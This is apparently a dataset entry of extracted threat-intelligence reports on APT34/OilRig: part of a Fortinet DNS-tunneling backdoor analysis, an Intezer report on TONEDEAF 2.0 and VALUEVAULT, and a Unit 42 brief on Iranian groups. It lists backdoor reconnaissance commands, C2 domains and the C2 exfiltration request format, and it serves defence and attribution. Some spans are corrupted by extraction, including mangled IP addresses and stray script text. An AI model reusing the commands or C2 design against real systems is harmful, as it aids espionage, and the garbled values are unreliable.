Get-NetIPConﬁguration | Foreach IPv4DefaultGateway | Select-Object NextHop Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object SERVERAddresses CMD systeminfo | ﬁndstr /i \""Domain\"" Figure 14. Table of backdoor commands The 6 command is actually missing from this malware. Whether a file is uploaded or a backdoor command is executed, there is some sort of output. This output is then formatted and compressed using .NET’s compression mode. After the result is encoded with base32, this new result is then incorporated into the DGA. Base32 is also the same encoding scheme that APT34 has used. https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 8 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 Figure 15. DNS exfiltration This is how the malware exfiltrated the data. It may look like a simple DNS request in a network log, but the exfiltrated data is actually built into the DNS request. With the amount of work put into developing this malware, it does not appear to be the type to execute once and then delete itself, like other stealthy infostealers. Perhaps to avoid triggering any behavioral detections, this malware also does not create any persistence methods. Instead, it relies on the Excel macro to create persistence by way of a scheduled task. Since Excel is a signed binary, maintaining persistence in this way may be missed by some behavioral detection engines. The problem with using a scheduled task as a persistence mechanism, however, is that it runs the risk of having multiple copies of itself running concurrently. To avoid this problem, the malware creates a mutex. A mutex (mutual exclusion object) is a program object that is created so multiple program threads can take turns sharing the same resource. In its most basic definition, it is simply a locking mechanism. If a mutex with a value of 726a06ad-475b-4bc6r8466-f08960595f1e already exists on the system, it means there is already a previous instance of the malware running on the infected computer. As a result, if a scheduled task starts another copy of the malware, the malware detects the mutex, and it is terminated immediately. C2 Servers This malware has the ability to contact three domains (joexpediagroup[.]com, asiaworldremit[.]com, uber-asia[.]com). Similarly, the Excel macro is able to contact the joexpediagroup[.]com domain. Uber-asia[.]com This domain, which may be imitating Uber rideshare for Asia, was registered slightly more than two months ago, on February 27, 2022. According to passive DNS records, this domain resolves to 127p.q0p.q0p.q1. Interestingly enough, VirusTotal was able to record a DNS entry. https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 9 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 This certainly fits the format used by the malware. The subdomain appears to be a DGA. The first octet of the IP address is greater than 128, and the remaining octets define the size of the command to be executed. Unfortunately, the rest of the DNS data is not available. This suggests that the malware operators are closely monitoring this C2 server and only activate it when necessary. Figure 16. Virustotal DNS results Joexpediagroup[.]com This domain, which may be imitating Expedia travel for Jordan, was created earlier this year, on January 20, 2022. Sometime after April 20, 2022, this domain also started resolving to 127p.q0p.q0p.q1, most likely for the same reason as above. Prior to that, however, the domain resolved to 45p.q11p.q19p.q47. The server also had SSH port 22 open. Our own Fortinet telemetry detected someone connecting to this IP address from the country of Jordan. Asiaworldremit[.]com This domain, which may be imitating WorldRemit for Asia, was created on the same day as the first C2 server, on February 27, 2022. Around April 19, 2022, this domain also resolved to 127p.q0p.q0p.q1. Prior to that, however, it resolved to 193p.q239p.q84p.q207. In the past, this IP address has been used by the NSO group with their Pegasus spyware. According to our telemetry, this IP address has also been used by APT34/OilRig/Helix Kitten and GoziIFSB. It has also been used as a VPN address. Passive DNS records indicate the IP address is currently hosting several suspiciously-named domains, some of which are listed below. Registered Domain Attempting to masquerade as astrazeneeca[.]com AstraZeneca astrazencea[.]com AstraZeneca hsbcbkcn[.]com HSBC Bank China valtronics-ae[.]com Valtronics AE ntu-sg-edu[.]com Nanyang Technological University Singapore theworldbank[.]uk World Bank Group coinbasedeutschland[.]com Coinbase for Germany cisco0[.]com Cisco Figure 17. Fake domains https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 10 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 The three C2 domains used by this malware seem to have a similar naming convention as the other domains found on this IP address. Conclusion The amount of effort put into developing this attack is much higher than the average run-of-the-mill phishing/spam campaign, putting it on the level of an APT attack. From the start, the attackers posed as a valid user and kept the email short without any grammatical errors. They then proceeded to use an Excel macro with advanced techniques, including possible anti-analysis techniques with the mouse check and the sheet visibility switch. Furthermore, while state programming is rarely used in malware, in this attack, both the Excel macro and the malware make use of it. After checking in, the malware sleeps for 6r8 hours. One likely reason might be that the threat actors expected the diplomat to open the spearphishing email in the morning and then leave at the end of the day. At that point, the attackers would be free to operate. While using DNS tunneling for C2 communications is nothing new, it is rarely seen in practice. Their backdoor also supports a long list of very specific commands. From the looks of things, the threat actors did their homework since their backdoor commands clearly demonstrate they already had prior knowledge of their target’s internal network infrastructure. This indicates that the threat actors most likely gained limited access somewhere else before this spearphishing attempt was made. Looking at their C2 servers, two out of the three seem to be tightly controlled. They were only brought up at specific times. The third C2 server has been lumped in with various other domains to further complicate proper attribution. Given all the breadcrumbs, this campaign looks to be another one launched by APT34. They have demonstrated they possess the resources necessary to infiltrate a government network and are no strangers to using more advanced techniques. Fortinet Protections Fortinet customers are protected from this malware by FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, FortiEDR, and CDR (content disarm and reconstruction) services: The FortiGuard Antivirus service detects and blocks the malicious Excel file as MSExcel/Agent.7CCA!tr and the malware binary as MSIL/Agent.A52D!tr. The malicious macros inside the Excel sample can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service. FortiEDR detects the Excel file and the malware binary as malicious based on their behavior. Fortinet customers are protected from this malicious Excel file and malware binary by FortiGuard AntiVirus, which is included in FortiMail. It detects all malicious macro file types, including Excel 4.0 Macro samples. All relevant URLs have been rated as ""Malicious Websites"" by the FortiGuard Web Filtering service. IOCs Files Indicator SHA256 Conﬁrmation Receive Document.xls 82A0F2B93C5BCCF3EF920BAE425DD768371248CDA9948D5A8E70F3C34E9F7CCA Microsoft.Exchange.WebServices.dll 7EBBEB2A25DA1B09A98E1A373C78486ED2C5A7F2A16EEC63E576C99EFE0C7A49 update.exe.conﬁg C744DA99FE19917E09CD1ECC48B563F9525DAD3916E1902F61B79BDA35298D87 update.exe E0872958B8D3824089E5E1CFAB03D9D98D22B9BCB294463818D721380075A52D Other Indicator Value Mutex 726a06ad-475b-4bc6-8466- f08960595f1e C2 domain joexpediagroup[.]com C2 domain asiaworldremit[.]com C2 domain uber-asia[.]com Mitre TTPs Initial Access https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 11 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 T1566.001 Spearphishing Execution T1059.001 PowerShell T1059.003 Windows Command Shell T1053.005 Scheduled Task T1204.002 Malicious File T1047 Windows Management Instrumentation Persistence T1053.005 Scheduled Task Defense Evasion T1480 Execution Guardrails Discovery T1087.001 Local Account T1083 File and Directory Discovery T1049 System Network Connections Discovery Command and Control T1071.004 DNS T1132.002 Non-Standard Encoding T1568.002 Domain Generation Algorithms Exﬁltration T1041 Exﬁltration Over C2 Channel Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio. Related Posts https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 12 di 14"
oilrig,cti-hal,0d3c4c32de1e,G0049,"Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 New Iranian Campaign Tailored to US Companies Utilizes an Updated Toolset Written by Paul Litvak and Michael Kajiloti - 30 January 2020 indow),ahaven,defa clearTimeout(g)g=setTinbu trigger-c.trigger.bind(C)J),a:/54M= stionda,b)(return:n[1-a)-JS00.strang D)l""usestrict;returnObject. ctobjects:function(a)(switcha.Jength 2/,length)(case0:return maDofortifieeze/(EMPTYGIFURT: uthaverdefine?* cachinmuch ntroduction IIntroduction Our researchers Paul Litvak and Michael Kajilolti have discovered a new campaign conducted by APT34 employing an updated toolset. Based on uncovered phishing documents, we believe this Iranian actor is targeting Westat employees, or United States organizations hiring Westat services. Westat is a United States-based company that “provides research services to agencies of the U.S. Government, as well as businesses, foundations, and state and local governments”. One example of the https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 1 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 services Westat o""ers is a survey for federal workers, which leads us to believe this attack may target Westat customers. O!cial Westat response: “Westat understands that in their e""ort to identify threats and malware, Intezer has identiﬁed a malicious ﬁle that uses the Westat name and logo. This ﬁle was not created by, hosted by, or sent from Westat, and is likely the result of a bad actor stealing the Westat brand name and logo. Our cybersecurity team is working with Intezer and others to fully understand the nature of this report. We will continue to monitor the situation and respond accordingly.” APT34 Background APT34 Background APT34 (also known as OilRig or Helix Kitten) is a cluster of Iranian government-backed cyber espionage activities that has been active since 2014. The group is known to target various international organizations, mainly in the Middle East. Among their targeted industries are government agencies, ﬁnancial services, energy and utilities, telecommunications, and oil and gas. More light was shed on this group in April 2019 as leaks emerged from a mysterious individual with the pseudonym “Lab Dookhtegan”. This individual exposed data belonging to victims of this group, together with source code of hacking tools and data about previous APT34 operations; including IP addresses and domains where the group hosted web shells related to past operations. Most recently, FireEye exposed a spear-phishing operation conducted by APT34, which enabled us to connect this operation to this Iranian actor due to similarities in the techniques and tools employed in both campaigns. Initial Vector Initial Vector https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 2 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 In late January 2020, we discovered a ﬁle named survey.xls that was designed to look like an employee satisfaction survey tailored to either Westat employees or Westat customers. At ﬁrst the spreadsheet appeared to be blank. Only once the victim enables macros, the survey is displayed to the user and the malicious VBA code begins to execute. survey.xls The embedded VBA code unpacks a zip ﬁle into a temporary folder, extracts a “Client update.exe” executable ﬁle and installs it to “C:Users<User>valsClient update.exe”. “Client update.exe” is actually a highly modiﬁed version of the TONEDEAF malware, which we named TONEDEAF 2.0. Finally, the crtt function creates a scheduled task “CheckUpdate” that runs the unpacked executable ﬁve minutes after being infected by it, as well as on future log-ons. https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 3 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 Survey.xls VBA Code Both the extracted VBA code and the functionality of the code look similar to the one analyzed in the FireEye report: APT34 VBA Code from the FireEye Report In addition, we found a similar document labelled as “Employee satisfaction survey.xls” containing the same survey as the previous document. https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 4 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 Employee Satisfaction survey.xls However, it’s important to highlight that the code page ﬁeld of this document is Arabic as can be seen when examining its ﬁle metadata, denoting the preferred language installed on the document author’s version of Microsoft Excel: Employee Satisfaction survey.xls Metadata TONEDEAF 2.0 TONEDEAF 2.0 TONEDEAF 2.0 TONEDEAF 2.0 At ﬁrst glance, “Client update.exe” seems like a completely new backdoor malware. However, further examination reveals it’s most likely a highly modiﬁed version of the previously seen TONEDEAF backdoor. TONEDEAF is a backdoor that communicates with its Command and Control server via HTTP in order to receive and https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 5 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 execute commands. It was mentioned in FireEye’s recent report about an ongoing APT34 operation, as one of the group’s custom tools. We have named the new variant TONEDEAF 2.0. TONEDEAF 2.0 is an advanced version of TONEDEAF, serving the same purpose as the original, but with a revamped C2 communication protocol and a substantially modiﬁed code base. In contrast to the original TONEDEAF, TONEDEAF 2.0 contains solely arbitrary shell execution capabilities, and doesn’t support any predeﬁned commands. It’s also more stealthy and contains new tricks such as dynamic importing, string decoding, and a victim deception method. New Tricks New Tricks New Tricks New Tricks Upon execution the backdoor checks whether it was executed with “…” as an argument, which is the way it’s conﬁgured to execute by the scheduled task, as part of the proper infection chain. In the case it’s executed without the correct argument, such as by launching it via a double click, it will display a blank GUI Window to the user. This is most likely intended to serve as a deception method, to make the malware appear like a legitimate (alibiet broken) application titled “Bee”. GUI Window Used for Deception https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 6 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 TONEDEAF 2.0 also attempts to be more stealthy than its predecessor by hiding many of the interesting API imports it uses. The names of these APIs, and the DLLs that contain them, are stored as encoded strings and are decoded and resolved on demand during runtime. Decoding and Resolving API Functions C2 Communication C2 Communication C2 Communication C2 Communication The backdoor uses HTTP for C2 communication, with a custom encoding and handshake mechanisms. Messages sent by the backdoor always contain the HTTP query parameter “?ser=<6 digits>” as an identiﬁer. The ﬁrst three digits are the <server_id> and the last three are the <client_id>. The backdoor will use one of the following two messages: 1. GET /dow?ser=<server_id><client_id> – request message, used to obtain commands to execute from the server. 2. POST /upl?ser==<server_id><client_id> – reply to command message, used to send the executed command’s output to the server. Before performing the ﬁrst request, the malware will generate the <client_id> derived from the environment variables %HOMEPATH% and %COMPUTERNAME% using a custom formula. https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 7 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 It will then send an initial GET message to the C2 using that ID. C2 Request One odd element about the communication is the usage of a Windows Phone User-Agent value in the HTTP message. During our analysis the C2 was alive but continuously replied with a 403 Forbidden HTTP error code to our requests. It’s possible that the C2 is ﬁltering the targets since this backdoor is part of a targeted operation and our client_id parameter does not match that of one of the intended victims. Should the C2 accept the ID, it will reply with an encoded message that contains the <server_id> and the command the backdoor needs to execute. The malware extracts the command by looking for an HTTP div element in the response with a special class name. https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 8 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 Parsing of C2 Response The malware will then execute the command by prepending it with “cmd U c” and will send the output of the command back to the C2 using the POST reply message (2). When entering the C2 via a browser, the site tries to imitate https://docs.microsoft.com/en-us/, although it fails to display it properly due to a misconﬁguration with the CSS, as can be seen in the console: https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 9 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 manygoodnews[.]com C2 webpage We have also observed that an SSL certiﬁcate has been recently generated that matches the domain of the C2. https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 10 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 SSL Certiﬁcate for the C2 Domain that was Issued One Month Ago These ﬁndings might indicate that the attackers are in the process of transitioning into HTTPS for C2 communication, in an attempt to improve their OPSEC capabilities and avoid detection. Traces from the Original TONEDEAF Traces from the Original TONEDEAF Traces from the Original TONEDEAF Traces from the Original TONEDEAF With all of the changes and new additions, there are still enough similarities that link TONEDEAF 2.0 to the original. While the code is mostly modiﬁed, the general ﬂow and functionality are similar. The C2 communication is di""erent but still has similarities to its predecessor, such as the usage of three digit identiﬁers for both the victim and the server. However, most notably there are several places in the code where the similarity is most clear. One such place is a function that exists in both variants, which oddly enough creates a notiﬁcation icon in the Windows status bar. The only notable changes are the usage of dynamic API resolution and the shortening of the notiﬁcation message from “Updating” to “up”. Speciﬁc Function Comparison https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 11 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 Another instance is the code that sets the working directory of the program. It appears in di""erent stages for each variant, but is identical: Similar Code Snippets VALUEVAULT 2.0 VALUEVAULT 2.0 VALUEVAULT 2.0 VALUEVAULT 2.0 We were unable to download further modules, however, we believe this operation also includes the usage of a VALUEVAULT implant. VALUEVAULT is a browser credential theft tool built in Golang, discovered by FireEye in the aforementioned APT34 operation analysis. We found the survey.xls ﬁle uploaded to VirusTotal with a VALUEVAULT instance and a TONEDEAF 2.0 instance, uploaded from Lebanon by the same user, only a few minutes apart. This may indicate that these malware were delivered together as part of the same attack. This VALUEVAULT takes a more minimalistic approach than its predecessor. Many functionalities and strings were stripped from the new binary in order to lower its noise. Only Chrome password dumping is now supported, although interestingly the use of the ﬁle “fsociety.dat” as a password data store under the “AppData\Roaming” directory stayed the same. https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 12 di 15 Iranian Campaign Tailored to US Companies Uses Updated Toolset - Intezer 08/08/24, 11:28 VALUEVAULT 2.0 Compilation Paths VALUEVAULT 1.0 Compilation Paths Furthermore, VALUEVAULT 2.0 is a 64-bit binary as opposed to VALUEVAULT 1.0 which is a 32-bit binary. These relatively minor changes were enough to create a fully undetected implant. Product Learn FAQ Pricing  Get a Demo Conclusion Conclusion Conclusion Conclusion The last APT34 operation was exposed only a few months ago by   FireEye, and judging by our current ﬁndings we can conﬁdently state that the group has since evolved its operations. The technical analysis of the new malware variants reveals this Iranian government-backed group has invested substantial e""orts into upgrading its toolset in an attempt to evade future detection. Subscribe to our Blog Business Email Subscribe The binary code from these new malware samples are now indexed in our Genetic Malware Analysis platform, Intezer Analyze. We encourage you to use our free community edition to detect and Share article classify threats that share code with APT34 malware.     IOCs manygoodnews[.]com c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca 4c323bc11982b95266732c01645c39618550e68f25c34f6d3d79288eae7d4378 a897164e3547f0ce3aaa476b0364a200769e8c07ce825bcfdc43939dd1314bb1 20b3d046ed617b7336156a64a0550d416afdd80a2c32ce332be6bbfd4829832c d61eecd7492dfa461344076a93fc2668dc28943724190faf3d9390f8403b6411 https://intezer.com/blog/research/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Pagina 13 di 15"
oilrig,cti-hal,93bfeff21c86,G0049,"Threat Brief: Iranian-Linked Cyber Operations 07/08/24, 10:10 About Unit 42 Services Unit 42 Threat Research Partners Resources Under Attack? Threat Research Center High Proﬁle Threats Nation-State Cyberattacks N A T I O N - S T A T E C Y B E R A T T A C K S Threat Brief: Iranian-Linked Cyber Operations 6 min read By: Unit 42 Published: 9 January, 2020 at 6:00 PM PST Categories: High Profile Threats , Nation-State Cyberattacks Tags: Advanced Persistent Threat , APT34 , Cobalt Gypsy , DarkHydrus , Elfin , Evasive Serpens , Helix Kitten , Magic hound , MuddyWater , Newscaster , OilRig , Refined Kitten , Shamoon , Shamoon 2 , Shamoon 3 , Static Kitten Share Table of Contents This post is also available in: 日本語 (Japanese) Executive Summary With elevated tensions in the Middle East region, there is signiﬁcant attention being paid to the potential for cyber attacks emanating from Iran. The following threat brief contains a summary of historical campaigns that are associated with Iranian activity and does not expose any new threat or attack that has occurred since the events of January 3rd, 2020. Since 2010, it is thought that Iran has been highly active in cyber operations campaigns throughout the world. A number of groups and campaigns have been named and published on by the private sector, but direct attribution to the nation-state of Iran is still largely lacking in many of these instances. Most attribution published by the private sector has relied on tactical evidence surrounding targeting and possible motivations. It is important to keep this in mind, while at the same time understanding that without additional evidence, the current attribution set is accepted industry-wide as fact. Unit 42 has not gathered evidence to speciﬁcally attribute any of the accepted groups as originating from Iran, but also has not observed any evidence to counter any publicly made claims. Overview of Iran-Linked Campaigns: Some of the currently active groups or campaigns publicly attributed by the industry as originating from Iran are: OilRig (AKA APT34/Helix Kitten) MagicHound (AKA APT35/Newscaster/Cobalt Gypsy) APT33 (AKA Reﬁned Kitten/Elﬁn) https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/ Pagina 1 di 7 Threat Brief: Iranian-Linked Cyber Operations 07/08/24, 10:10 DarkHydrus Shamoon MuddyWater (AKA Static Kitten) There appear to be two distinct motivators for these groups, espionage and destruction. The majority of observed attack campaigns have been espionage related, with the associated groups appearing to seek continued access into a target organization or access to sensitive data. A smaller number of highly focused destructive attacks have been observed over time, beginning with the original Shamoon attack in 2012, with additional iterations years after, and more recently with StoneDrill and ZeroCleare. Overall, cyber attacks thought to be originating from Iran have been persistent and ongoing for the last decade. The target radius for these groups have spanned across the globe, across all major industries. Although perceived retaliatory actions may occur in the near future, even those actions are most likely in conjunction with ongoing attack campaigns and operations. Iranian TTPs: Behaviorally, several tactics and techniques have been observed across multiple groups and campaigns over time. The following is a list of commonly observed tactics and techniques along with their associated ATT&CK IDs: Phishing (T1193 and T1192) Credential harvesting (T1078, T1003, T1503, T1081, T1214) DNS Tunneling (T1071) DNS Hijacking (T1326) EldoS RawDisk driver (T1485, T1488, T1487, S0364) Malicious macros (T1204) Weaponized Excel and Word documents (T1204, T1221, T1173) Script based backdoors (T1064, T1027) Webshell deployment (T1108, T1133, T1190, T1027) Domain masquerading (T1328) Scheduled tasks (T1053) Use of Mimikatz (T1003, T1207, T1098, T1081, S0002) Exploitation of enterprise VPN Software (T1133, T1210) General Mitigations: With this knowledge of common behaviors, some mitigations recommendations are: Increase education and awareness against phishing attacks in your organization via exercises and informational resources Enable or implement multi-factor authentication on public facing systems, or more preferably, across the entire organization Enable or implement credential theft detection features in network security devices Enable or implement anomalous DNS behavior detection/prevention capability Blacklist EldoS RawDisk driver, unless absolutely required for business purposes Review security policies for macro documents and restrict execution where possible Review security policies for script ﬁle execution on endpoints and restrict where possible Review all public facing network applications and deploy up-to-date patches Enable or implement domain or URL categorization features in network security devices Scan endpoints for new or unknown scheduled tasks Implement detection and prevention logic for behaviors associated with Mimikatz Patch remotely exposed software for known vulnerabilities as soon as possible Palo Alto Networks’ Customer Mitigations: Palo Alto Networks customers should adopt best practices and evaluate their security posture to protect against the threats outlined in this document as well as other threats that may impact their network and users. Best Practice Resources Best Practice Assessment Security Lifecycle Review Group Details OilRig (AKA APT34/Helix Kitten) https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/ Pagina 2 di 7 Threat Brief: Iranian-Linked Cyber Operations 07/08/24, 10:10 https://attack.mitre.org/groups/G0049/ OilRig is a threat group Unit 42 named and discovered in May 2016. Since then, we have extensively researched their campaigns and operations. This threat group is extremely persistent and relies heavily on spear-phishing as their initial attack vector, but has also been associated with other more sophisticated attacks such credential harvesting campaigns and DNS hijacking. In their spear-phishing attacks, OilRig preferred macro-enabled Microsoft Oﬃce (Word and Excel) documents to install their custom payloads that came in the form of portable executables (PE), PowerShell and VBScripts. OilRig’s custom payloads frequently used DNS tunneling as a command and control (C2) channel. Once gaining access to an end point, actors would use credential dumping tools, such as Mimikatz to gather credentials to legitimate accounts to then move laterally to other systems on the network. When presented with a webserver, OilRig would install a webshell as another ingress point to maintain access to the network. References https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/ https://unit42.paloaltonetworks.com/unit42-analyzing-oilrigs-ops-tempo-testing-weaponization-delivery/ https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/ https://unit42.paloaltonetworks.com/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/ https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/ https://unit42.paloaltonetworks.com/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/ https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/ https://unit42.paloaltonetworks.com/unit42-oilrig-performs-tests-twoface-webshell/ https://unit42.paloaltonetworks.com/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/ https://unit42.paloaltonetworks.com/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/ https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/ https://unit42.paloaltonetworks.com/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/ https://unit42.paloaltonetworks.com/unit42-oilrig-actors-provide-glimpse-development-testing-eﬀorts/ https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/ Magic Hound (AKA APT35/Newscaster/Cobalt Gypsy) https://attack.mitre.org/groups/G0059/ The Magic Hound campaign targeted energy, government, and technology organizations with spear-phishing emails as a delivery mechanism. These emails delivered macro-enabled Microsoft Oﬃce documents and PE ﬁles within attachments. The documents and executables attached to emails would install a variety of tools from portable PE ﬁles, .NET Framework PE ﬁles, Meterpreter, IRC bots, an open sourced Meterpreter module called Magic Unicorn, and an open sourced Python RAT called Pupy. The custom tools used in the Magic Hound campaign provided connections to other threat groups, such as the IRC Bot which was very similar to the Parastoo tool associated with the NEWSCASTER threat group. Also, a Magic Hound C2 server was also used as a C2 server for a tool called MPKBot that had been associated with the Rocket Kitten threat group. References https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ APT33 (AKA Reﬁned Kitten/Elﬁn) https://attack.mitre.org/groups/G0064/ APT33 is a threat group thought to have strong interest in the aeronautics and energy sectors. They use spear-phishing attacks with a domain masquerading technique to make the links in their emails appear legitimate. They are known to use custom tools in conjunction with well-known publicly available backdoors that are sold in various hacking forums. A recent report uncovered this threat group’s attack infrastructure, which leveraged commercial VPN providers in addition to compromised systems to use as proxies to further mask their origins. This activity exempliﬁed how this adversary group and other related groups will attack organizations outside of their mission objective to augment their own capabilities to complete their task. https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/ Pagina 3 di 7 Threat Brief: Iranian-Linked Cyber Operations 07/08/24, 10:10 References https://www.ﬁreeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/ DarkHydrus https://attack.mitre.org/groups/G0079/ The DarkHydrus threat group has targeted government entities and educational institutions with spear-phishing attacks and credential harvesting campaigns. DarkHydrus is a more sophisticated group when compared to others operating in the region, as their toolset and TTPs show a higher skill level. DarkHydrus has used custom tools in addition to publicly available red-teaming tools such as Phishery. They have also been observed using Google Drive for their C2 channel. References https://unit42.paloaltonetworks.com/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/ https://unit42.paloaltonetworks.com/unit42-darkhydrus-uses-phishery-harvest-credentials-middle-east/ https://unit42.paloaltonetworks.com/darkhydrus-delivers-new-trojan-that-can-use-google-drive-for-c2-communications/ Shamoon The original Shamoon attack was launched in 2012 and targeted two speciﬁc organizations in the energy sector with the goal of rendering their respective computer systems inoperable by wiping their disks. The attack package included a commercially available driver to execute the wiping tasks and also included a worming component which allowed the package to spread within a target organization in an automated manner. The 2012 incident was one of the ﬁrst large scale targeted destructive attacks that had been publicly shared. Since the original 2012 attack, two other instances of Shamoon have been discovered, in 2016 as well as 2018. In each instance, the primary capabilities and functionality remained largely the same. References https://securelist.com/shamoon-the-wiper-copycats-at-work/57854/ https://unit42.paloaltonetworks.com/unit42-shamoon-2-return-disttrack-wiper/ https://unit42.paloaltonetworks.com/unit42-second-wave-shamoon-2-attacks-identiﬁed/ https://unit42.paloaltonetworks.com/unit42-shamoon-2-delivering-disttrack/ https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/ https://unit42.paloaltonetworks.com/shamoon-3-modiﬁed-open-source-wiper-contains-verse-from-the-quran/ MuddyWater (AKA Static Kitten) MuddyWater is a group that emerged in 2017 and was initially thought to be part of the ﬁnancially motivated criminal group commonly referred to as FIN7 due to the use of an open source tool that was used by both sets of activity. Additional investigation revealed no other similarities in either tools or tactics, thus concluding that the MuddyWater activity was likely operated by a separate actor. This group generally used spear-phishing with macro-enabled Oﬃce documents to deliver their payloads, which were either embedded directly in the macro, or hosted on a ﬁrst stage C2 server. These C2 servers were observed to be either third party ﬁle hosting sites or code sharing repositories such as GitHub. A signiﬁcant portion of MuddyWater’s toolset consisted of open sourced red- teaming tools such as Invoke-Obfuscation, Lazagne, Mimikatz, etc. References https://unit42.paloaltonetworks.com/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/ https://securelist.com/muddywater/88059/ https://www.clearskysec.com/muddywater2/ https://blog.trendmicro.com/trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post- exploitation-tools/ Conclusion Assuming the highlighted groups are indeed Iranian in origin, their activity has been well documented and the various groups often times use very similar tactics and techniques to execute their attacks, such as the heavy use of spear-phishing and credential harvesting. This activity has been persistent for the last decade, and it should be expected to continue or increase with recent geopolitical events. However, across all of these groups as well as others that were not https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/ Pagina 4 di 7 Threat Brief: Iranian-Linked Cyber Operations 07/08/24, 10:10 highlighted, another consistent theme has been the abuse of poorly implemented IT and security policies. Enabling Multi-Factor Authentication (MFA) throughout an organization, properly segmenting networks, limited macro-enabled documents, and disallowing network activity to unknown domains are examples of relatively simple policies that could have assisted in the neutralization of these adversary groups’ malicious actions. Indicators Unit 42 has consolidated the IOCs of the referenced groups in this report and stored them in our GitHub repository. This dataset should not be considered comprehensive of all potential Iran-linked cyber operations, and may be subject to change without notice. Link to IOCs on GitHub Back to top T A G S Advanced Persistent Threat APT34 Cobalt Gypsy DarkHydrus Elﬁn Evasive Serpens Helix Kitten Magic hound MuddyWater Newscaster OilRig Reﬁned Kitten Shamoon Shamoon 2 Shamoon 3 Static Kitten Threat Research Center Next: Wireshark Tutorial: Examining Ursnif Infections Related Nation-State Cyberattacks Resources T H R E A T A C T O R G R O U P S T H R E A T A C T O R G R O U P S T H R E A T R E S E A R C H Fighting Ursa Luring Targets With Car for Sale Advanced Persistent Threat APT28 Fancy Bear Threat Actor Groups Tracked by Palo Alto Networks Unit 42 Academic Serpens Agent Serpens Agonizing Serpens Operation Diplomatic Specter: An Active Chinese Cyberespionage 